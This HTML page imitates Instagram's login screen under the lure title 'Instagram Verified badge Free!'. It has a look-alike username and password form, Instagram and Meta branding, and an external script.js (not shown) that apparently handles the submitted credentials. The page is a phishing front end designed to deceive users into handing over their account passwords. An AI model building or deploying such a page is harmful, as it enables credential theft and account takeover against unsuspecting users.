<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <head>
    <title>Instagram Verified badge Free!</title>
    <link rel="icon" type="image/png" href="insta.jpg">

  </head>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="login-container">
    <img src="bandicam 2025-05-16 08-52-37-622.jpg" alt="">

    <button class="fb-btn" onclick="window.location.href='https://facebook.com';">
        <img src="bandicam 2025-05-16 08-56-26-488.jpg" alt="">
      </button>

    <div class="divider"><span>OR</span></div>

    <form class="login-form">
      <input type="text" placeholder="Phone number, username, or email" required />
      <div class="password-box">
        <input type="password" placeholder="Password" id="password" required />
        <span class="show-btn" onclick="togglePassword()">Show</span>
      </div>
      <a href="#" class="forgot">Forgot password?</a>
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <div class="signup">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <p class="terms">
      By continuing, you agree to Instagramâ€™s <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
    </p>

    <img class="meta" src="META.svg" alt="">
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const showBtn = document.querySelector(".show-btn");
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        showBtn.textContent = "Hide";
      } else {
        passwordInput.type = "password";
        showBtn.textContent = "Show";
      }
    }
  </script>
  <script src="script.js"></script>
</body>
</html>
